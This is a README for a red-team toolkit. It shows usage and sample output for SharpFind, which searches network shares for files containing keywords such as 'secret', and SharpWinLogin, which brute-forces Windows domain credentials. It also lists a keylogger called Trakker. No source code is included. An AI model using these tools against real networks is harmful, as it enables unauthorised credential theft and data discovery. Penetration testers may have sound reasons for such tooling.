# RTUtils

Repository of random tool / script used during RT / PT

## SharpFind

C# .NET for finding file name and keyword

### Usage

```
C:\>.\SharpFind.exe
For searching by name: SharpFind.exe name {directory} {name} {extension} [outputFile]
For searching by keyword: SharpFind.exe keyword {directory} {keyword} {extension} [outputFile]

- directory: C:\path\to\directory\ or \\path\to\directory\ or LocalShares (to search into all local network computers [net view]) or LogicalDisk (to search into all logical disks)
- name and keyword: case insensitive
- extension: *.* or *.txt
```
### Example
```
C:\>.\SharpFind.exe keyword LocalShares secret *.*
[*] Getting Shares...
\\EVILCORPVM01\ADMIN$
\\EVILCORPVM01\C$
\\EVILCORPVM01\IPC$
\\EVILDC\NETLOGON
\\EVILDC\SYSVOL
\\EVILDC\Users
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.doc
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.docx
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.pdf
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.xls
[+] \\EVILDC\Users\elliot\Desktop\shared\keyword.xlsx

C:\ >.\SharpFind.exe name LocalShares findme *.*
[*] Getting Shares...
\\EVILCORPVM01\ADMIN$
\\EVILCORPVM01\C$
\\EVILCORPVM01\IPC$
\\EVILDC\NETLOGON
\\EVILDC\SYSVOL
\\EVILDC\Users
[+] \\EVILDC\Users\elliot\Desktop\shared\AnotherDir\findme.txt
```
## SharpWinLogin

C# .NET for brute-forcing Windows Domain Credential 

### Usage

```
C:\>.\SharpWinLogin.exe
SharpWinLogin.exe {usernameList} {passwordList} {lockoutThreshold} [outputFile]
For searching by keyword: SharpFind.exe keyword {directory} {keyword} {extension} [outputFile]

- usernameList: C:\\path\\to\\usernameList.txt or "username1,username2" or auto (to retrieve the username list from Domain Controller)
- passwordList: C:\\path\\to\\passwordList.txt or "password1,password2"
- lockoutThreshold: n or 0 (for no lockout threshold)
```
### Example
```
C:\>.\SharpWinLogin.exe “locked,angela” “locked,angela1990,test” 0
User locked is disabled
[+] Found credentials angela:angela1990

C:\ >.\SharpWinLogin.exe auto “angela1234,test” 0
User locked is disabled
[+] Found credentials angela:angela1234
```

## Trakker

C# .NET simple Keylogger
